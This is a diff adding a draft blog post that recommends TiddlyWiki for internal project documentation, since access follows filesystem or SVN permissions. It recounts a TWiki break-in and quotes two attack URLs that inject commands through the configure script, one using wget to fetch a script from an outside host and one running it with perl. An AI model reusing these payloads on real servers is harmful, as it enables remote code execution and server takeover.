@@ -1,0 +1,20 @@
+@title Wiki Me Happy
+@draft
+
+For storing large collections of data and keeping them up to date, Wiki software is usually considered to be the superior option. The althernatives are either hard to navigate (Microsoft Office files) or difficult to modify (Manpages, PDF documents, compiled HTML).
+
+The trouble with Wiki is that it's usually intended for access by large audiences in read-write mode (one of the tenets of the Wiki philosophy is that if you don't like what you read, you can edit it). So, the end result is software where managing users and permissions is very difficult, if not outright impossible. After a lot of searching with no obvious fail-safe way of being certain that I restricted users correctly, I gave up.
+
+To say nothing of a sad experience I had with TWiki, accessing URLs of the form:
+<p style="padding-left: 30px;"><span style="font-family: Calibri;">/twiki/bin/configure?action=image;image=|wget%20http://cvbeer.com/cvblog/xmlsrv/dc.txt|
+/twiki/bin/configure?action=image;image=|perl%20dc.txt|</span>
+
+This managed to bring the server down with its knees (the wiki actually executed the commands it was provided with by some random internet hacker, and turned into a zombie).
+<h2>Local Wiki</h2>
+The idea of a local wiki, based on the user's filesystem, struck me. This way, I could restrict users to getting only the files they're allowed to use by harnessing the read/write rules of either a remote filesystem under my control or even a Subversion repository (thereby placing the wiki documentation within the project directory).
+
+A quick web search later, I stumbled upon <a href="http://www.tiddlywiki.com/" target="_blank">TiddlyWiki</a>, which is a wiki system contained within a single HTML file. Javascript is used for extracting the pages and for navigation, as well as automatically saving the file back to the disk when it's modified (Internet Explorer does make somewhat of a fuss over it, but as a whole it works as well).
+
+Since it's inside an HTML file, it can only be accessed and modified if the filesystem or SVN repository gives the user read-access and write-access, which solves the access problem by applying enough <span style="text-decoration: line-through;">violence</span> existing functionality. The issue of concurrent edits is also solved by using SVN, since the data is stored within the HTML file in a reasonable format, and can thus be merged by the canonical text diff/merge tools. Besides, the backup is completely trivial, and I can design a seed wiki from which new per-project wikis can be created at will simply by copy-pasting. Last but not least, I can always decide to filter critical information out of the wiki and put the result online for everyone to read.
+
+So, use TiddlyWiki for internal project documentation.</p>
